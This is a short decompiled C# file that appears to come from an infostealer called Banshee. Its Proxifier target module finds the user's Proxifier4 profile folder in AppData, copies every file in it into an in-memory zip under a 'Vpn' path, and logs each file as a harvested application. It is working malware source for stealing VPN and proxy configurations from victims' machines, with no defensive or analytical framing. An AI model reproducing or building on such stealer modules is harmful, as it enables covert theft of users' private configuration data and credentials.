﻿using System;
using System.IO;
using Banshee.Helper.Data;

namespace Banshee.Targets.Vpn
{
	// Token: 0x02000035 RID: 53
	public class Proxifier : ITarget
	{
		// Token: 0x0600006F RID: 111 RVA: 0x0000450C File Offset: 0x0000450C
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Proxifier4", "Profiles");
			if (Directory.Exists(text))
			{
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "Proxifier";
				string text2 = ZipPath.Vpn("Proxifier");
				zip.AddDirectoryFiles(text, text2, true);
				counterApplications.Files.Add(text + " => " + text2);
				counterApplications.Files.Add(text2 + "\\");
				counter.Vpns.Add(counterApplications);
			}
		}
	}
}
